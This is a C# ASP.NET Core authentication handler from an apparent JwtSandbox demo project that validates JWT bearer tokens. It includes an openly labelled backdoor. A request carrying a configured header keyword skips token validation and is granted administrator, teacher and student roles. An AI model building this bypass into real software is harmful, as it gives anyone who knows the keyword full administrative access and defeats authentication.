using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.RegularExpressions;
using JwtSandbox.Models;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authorization;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;

namespace JwtSandbox.Handlers;

public class MyAuthHandler : AuthenticationHandler<MyAuthenticationSchemeOptions>
{
    private static readonly Regex _regex = new(@"Bearer\s([\w\W]*)", RegexOptions.Compiled);
    private readonly IConfiguration _configuration;
    private readonly AuthSetting _authSetting;
    private readonly IList<Claim> _backdoorClaims;

    /// <inheritdoc />
    public MyAuthHandler(IConfiguration configuration, IOptionsMonitor<MyAuthenticationSchemeOptions> options, ILoggerFactory logger,
        UrlEncoder encoder, ISystemClock clock) : base(options, logger, encoder, clock)
    {
        _configuration = configuration;
        _authSetting = _configuration.GetSection("AuthSetting").Get<AuthSetting>();
        _backdoorClaims = new List<Claim>()
        {
            new Claim("iss", _authSetting.Issuer),
            new Claim(JwtRegisteredClaimNames.Sub, "9999"),
            new Claim("role", MyRole.Administrator.ToString()),
            new Claim("role", MyRole.Teacher.ToString()),
            new Claim("role", MyRole.Student.ToString()),
        };
    }

    /// <inheritdoc />
    protected override async Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        await Task.CompletedTask;

        // skip authentication if endpoint has [AllowAnonymous] attribute
        var endpoint = Context.GetEndpoint();
        if (endpoint?.Metadata?.GetMetadata<IAllowAnonymous>() != null)
            return AuthenticateResult.NoResult();

        var authToken = string.Empty;
        var key = Encoding.ASCII.GetBytes(_authSetting.Secret);

        // 撿查有沒有帶後門 token
        Request.Headers.TryGetValue(_authSetting.BackdoorHeaderName, out var backdoor);
        if (backdoor == _authSetting.BackdoorKeyword)
        {
            var identity = new ClaimsIdentity(_backdoorClaims, Scheme.Name, JwtRegisteredClaimNames.Sub, "role");
            var claims = new ClaimsPrincipal(new ClaimsIdentity(identity));
            return AuthenticateResult.Success(new AuthenticationTicket(claims, Scheme.Name));
        }

        if (!Request.Headers.TryGetValue(_authSetting.AuthorizationHeaderName, out var authValue))
        {
            var error = "token 格式錯誤";
            await WriteErrorResponse(StatusCodes.Status401Unauthorized, error);
            return AuthenticateResult.Fail(error);
        }

        var match = _regex.Match(authValue);
        if (match.Success)
            authToken = match.Groups[1].Value;

        var handler = new JwtSecurityTokenHandler();
        JwtSecurityToken jwtSecurityToken;
        try
        {
            jwtSecurityToken = handler.ReadJwtToken(authToken);
        }
        catch
        {
            var error = "Token Not Found.";
            await WriteErrorResponse(StatusCodes.Status401Unauthorized, error);
            return AuthenticateResult.Fail(error);
        }

        var validationParameters = new TokenValidationParameters
        {
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ValidateIssuer = true,
            ValidIssuer = _authSetting.Issuer,
            ValidateAudience = true,
            ValidAudience = _authSetting.Audience,
            ValidateLifetime = true
        };

        try
        {
            handler.ValidateToken(authToken, validationParameters, out var validatedSecurityToken);
            var identity = new ClaimsIdentity(jwtSecurityToken.Claims, Scheme.Name, JwtRegisteredClaimNames.Sub, "role");
            var claims = new ClaimsPrincipal(identity);
            return AuthenticateResult.Success(new AuthenticationTicket(claims, Scheme.Name));
        }
        catch (SecurityTokenExpiredException)
        {
            var error = "Token 過期";
            await WriteErrorResponse(StatusCodes.Status401Unauthorized, error);
            return AuthenticateResult.Fail(error);
        }
        catch (SecurityTokenNotYetValidException)
        {
            var error = "查無 SecurityToken";
            await WriteErrorResponse(StatusCodes.Status406NotAcceptable, error);
            return AuthenticateResult.Fail(error);
        }
        catch (SecurityTokenValidationException ex)
        {
            var error = "驗證失敗";
            await WriteErrorResponse(StatusCodes.Status401Unauthorized, error);
            return AuthenticateResult.Fail(error);
        }
        catch (Exception ex)
        {
            var error = "Token 解析失敗";
            await WriteErrorResponse(StatusCodes.Status406NotAcceptable, error);
            return AuthenticateResult.Fail(error);
        }
    }

    private async Task WriteErrorResponse(int statusCode, string error)
    {
        Context.Response.StatusCode = statusCode;
        var result = JsonSerializer.Serialize(new { error = error });
        Context.Response.ContentType = "application/json";
        await Context.Response.WriteAsync(result);
    }
}